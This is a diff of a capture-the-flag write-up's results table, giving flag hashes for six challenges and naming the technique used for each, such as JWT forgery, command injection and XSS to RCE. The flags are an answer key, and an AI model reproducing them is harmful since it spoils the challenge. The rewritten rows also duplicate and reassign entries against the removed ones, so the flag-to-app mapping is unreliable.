-| 1.  456113d7a6b2c73cb8de7f3fbde95580   | **RoyalFlush - Auth** | **HASH**   | **JWT FORGERY** |
-| 2.  ddf1df82dea9ce0d6ab3a03aa80cbdac   | **RoyalFlush - RCE**  |     **HASH**        |       **Command Injection**                |
-| 3.   39d18b5b75ce0bbba31b19630812e1b7  | **SecureData - Auth** |       **HASH**      |        **RACE CONDITION**               |
-| 4. 85cef6bf6a0a68f45c8d6eb37f2cb79c   | **SecureData - RCE**  |       **HASH**     | **XSS=>RCE**                      |
-| 5.  d26a4b37437173ac7c4dc2c708b6323f   | **VitaMedix - Auth**  |      **HASH**       |         **CRLF EMAIL HEADER INJECTION**              |
-| 6.  7c6ada9cb7aa60c7740bcb1dde7496bf   | **VitaMedix - RCE**   |       **HASH**      |     **Command Injection**                  |
+| Flag # | Application | Flag Value | Method Used |
+| ------ | ----------- | ---------- | ----------- |
+| 1. RoyalFlush Dashboard | **RoyalFlush - Auth** | **456113d7a6b2c73cb8de7f3fbde95580** | **JWT Forgery** |
+| 2. RoyalFlush RCE | **RoyalFlush - RCE** | **ddf1df82dea9ce0d6ab3a03aa80cbdac** | **Command Injection** |
+| 3. VitaMedix Dashboard | **VitaMedix - Auth** | **39d18b5b75ce0bbba31b19630812e1b7** | **Race Condition** |
+| 4. SecureData RCE | **SecureData - RCE** | **85cef6bf6a0a68f45c8d6eb37f2cb79c** | **XSS → RCE** |
+| 5. VitaMedix Dashboard | **VitaMedix - Auth** | **d26a4b37437173ac7c4dc2c708b6323f** | **CRLF Email Header Injection** |
+| 6. SecureData RCE | **SecureData - RCE** | **7c6ada9cb7aa60c7740bcb1dde7496bf** | **Command Injection** |
 
 
 ### Exploits {#exploits}
